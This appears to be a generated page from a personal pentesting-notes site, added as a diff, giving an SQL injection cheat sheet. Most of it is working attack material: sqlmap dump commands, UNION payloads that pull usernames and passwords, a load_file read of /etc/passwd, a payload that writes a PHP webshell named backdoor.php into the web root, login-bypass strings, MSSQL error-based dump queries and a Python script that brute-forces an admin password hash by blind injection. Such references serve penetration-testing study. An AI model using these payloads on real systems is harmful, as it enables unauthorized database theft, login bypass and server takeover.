@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>SQL Injection (SQLi) | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="SQL Injection (SQLi)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries." />
+<meta property="og:description" content="SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries." />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/web/sqli/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/web/sqli/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries.","url":"http://0.0.0.0:4000/hackingnotes/web/sqli/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"SQL Injection (SQLi)","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Web</h2>
+				<h3>SQL Injection (SQLi)</h3>
+			</div>
+			<article class="content">
+				<p>SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries.</p>
+
+<h1 id="automatization-with-sqlmap">Automatization with sqlmap</h1>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Post
+sqlmap -r request.txt -p username
+
+# Get
+sqlmap -u "http://example.com/index.php?id=1" -p id
+
+# Crawl
+sqlmap -u http://example.com --dbms=mysql --crawl=3
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note:</strong> <code class="highlighter-rouge">request.txt</code> is a request saved in BurpSuite.</p>
+</blockquote>
+
+<h2 id="dumping-a-table">Dumping a Table</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -r request.txt -p username -D database_name -T table_name --dump
+</code></pre></div></div>
+
+<h1 id="union-attack">Union Attack</h1>
+
+<p>When an application is vulnerable to SQL injection and the results of the query are returned within the application’s responses, the <code class="highlighter-rouge">UNION</code> keyword can be used to retrieve data from other tables within the database.</p>
+
+<p>MySQL syntax for the example:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$sql = "SELECT id, name, text FROM example WHERE id=" . $_GET['id'];
+</code></pre></div></div>
+
+<h2 id="column-number-enumeration">Column Number Enumeration</h2>
+
+<p>After detect that the application is vulnerable to SQLi we need to know how many columns are queried. To do that task we are going to use order by to guess the number of columns retrieved. The idea is to increment the number until get an error.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?id=1 order by 1
+/index.php?id=1 order by 2
+/index.php?id=1 order by 3
+/index.php?id=1 order by 4 - ERROR
+</code></pre></div></div>
+
+<h2 id="output-layout">Output Layout</h2>
+
+<p>Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?id=1 union all select 1, 2, 3
+</code></pre></div></div>
+
+<h2 id="extracting-data-from-database">Extracting Data from Database</h2>
+
+<p>Now knowing that the third column is for descriptions, we can put there all information.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?id=1 union all select 1, 2, @@version
+/index.php?id=1 union all select 1, 2, user()
+/index.php?id=1 union all select 1, 2, table_name from information_schema.tables
+/index.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+/index.php?id=1 union all select 1, username, passwords from users
+</code></pre></div></div>
+
+<h2 id="read-files">Read files</h2>
+
+<p>Some databases allows us to read or write files in the filesystem.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?id=1 union all select 1, 2, load_file('/etc/passwd')
+</code></pre></div></div>
+
+<h2 id="from-sqli-to-rce">From SQLi to RCE</h2>
+
+<p>Since we are allowed to upload files, we can upload a webshell to the web root.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?id=1 union all select 1, 2, "&lt;?php system($_GET['cmd']);?&gt;" into OUTFILE '/var/www/html/backdoor.php'
+</code></pre></div></div>
+
+<p>In case of exploiting a <strong>Microsoft SQL Server</strong> check this:</p>
+
+<ul>
+  <li><a href="../../services/sql-server/">SQL Server</a></li>
+</ul>
+
+<h1 id="login-bypass">Login Bypass</h1>
+
+<p>The most classic ones:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' or '1'='1
+' or 1=1-- -
+' or 1=1# 
+</code></pre></div></div>
+
+<p>Then others:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-'
+' '
+'&amp;'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&amp;'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&amp;"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&amp;"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+</code></pre></div></div>
+
+<h2 id="knowing-the-username">Knowing the username</h2>
+
+<p>When we are aware of some username we can impersonate him with SQLi by introducing the username and commenting the rest of the SQL Query.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>administrator'-- -
+administrator'# 
+</code></pre></div></div>
+
+<h1 id="error-based-sqli">Error Based SQLi</h1>
+
+<p>Use CONVERT or CAST to force an ERROR and see the output of the query on errors logs.</p>
+
+<p><em>Example of Microsoft SQL Server:</em></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1', CONVERT(int,SELECT ...... FROM ....)
+
+a',convert(int,(SELECT CURRENT_USER)))--
+a',convert(int,(SELECT DB_NAME(0))))--
+a',convert(int,(SELECT DB_NAME(1))))--
+
+# SELECT FIRST TABLE
+a',convert(int,(SELECT TOP 1 name from DATABASE..sysobjects where xtype='U')))--
+
+# SELECT A N TABLE (OFFSET)
+a',convert(int,(SELECT name from DATABASE..sysobjects where xtype='U' ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY )))--
+
+# SELECT A N COLUMN NAME(OFFSET) of TABLE
+a',convert(int,(SELECT name from DATABASE..syscolumns WHERE id = (SELECT id FROM DATABASE..sysobjects WHERE name = 'TABLE') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
+
+# DUMP - repeat it modifyng the OFFSET to retrieve all table entries
+a',convert(int,(SELECT username FROM DATABASE..TABLE ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
+a',convert(int,(SELECT password FROM DATABASE..TABLE ORDER BY password OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
+</code></pre></div></div>
+
+<h1 id="blind-sqli">Blind SQLi</h1>
+
+<p>A SQLi is blind because we don’t have access to the error log or any type of output which difficult a lot the process of exploitation.</p>
+
+<h2 id="time-based">Time Based</h2>
+
+<p>Since we are not aware about any type of error or output we can use sleeps.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1-sleep(4)
+</code></pre></div></div>
+
+<p>If it loads for four seconds extra we know that the database is processing our <code class="highlighter-rouge">sleep()</code> command.</p>
+
+<h2 id="dump-tables">Dump tables</h2>
+
+<p>It can also be done with sqlmap or manually with a custom script. In that case the script is dumping MD5 hashes from password field.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+chars = "0123456789abcdef"
+def GetSQL(i,c):
+    return "admin' and substr(password,%s,1) = '%s' -- -" % (i,c)
+for i in range(1,33):
+    for c in chars:
+        injection = GetSQL(i,c)
+        payload = {'username':injection,'password':"randompassword"}
+        r = requests.post('http://10.10.10.73/login.php',data=payload)
+        if 'Wrong identification' in r.text:
+            print(c,end='',flush=True)
+            break
+print()
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note:</strong> MD5 hash are hexadecimal with 33 character length.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md">https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</a></li>
+</ul>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li><a href="https://portswigger.net/web-security/sql-injection/union-attacks">https://portswigger.net/web-security/sql-injection/union-attacks</a></li>
+  <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html">https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html</a></li>
+</ul>
+
+			</article>
+		</section>
+
+		<script>
+			document.getElementById("open-nav").addEventListener("click", function () {
+				document.body.classList.toggle("nav-open");
+			});
+		</script>
+	</body>
+</html>
